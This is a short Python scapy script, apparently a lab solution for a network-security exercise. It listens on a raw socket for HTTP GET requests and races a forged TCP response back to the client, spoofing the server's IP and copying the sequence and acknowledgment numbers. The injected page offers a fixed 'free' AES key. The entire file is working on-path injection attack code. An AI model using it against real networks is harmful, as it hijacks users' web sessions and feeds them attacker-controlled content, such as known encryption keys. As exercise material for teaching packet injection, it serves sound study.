#!/usr/bin/python3

import scapy
from scapy.all import *

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    my_packet = Ether(pkt)
    if(my_packet.haslayer('Raw')):
        if(my_packet.getlayer('Raw').getfieldval('load').find(b'GET') == 0):
            my_dest = my_packet[IP].src
            my_ack = my_packet[TCP].seq
            my_seq = my_packet[TCP].ack
            my_dport = my_packet[TCP].sport
            l2 = IP(src='18.234.115.5', dst=my_dest, len=542, ihl=5, id=35436)
            l3 = TCP(dport=my_dport, sport='http', flags='PA', ack=my_ack , seq=my_seq,window=65535, dataofs=5)
            l4 = Raw(load = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Wed, 17 Mar 2021 17:59:45 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>')
            atk_pkt = l2/l3/l4
            inject_pkt(atk_pkt)




def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
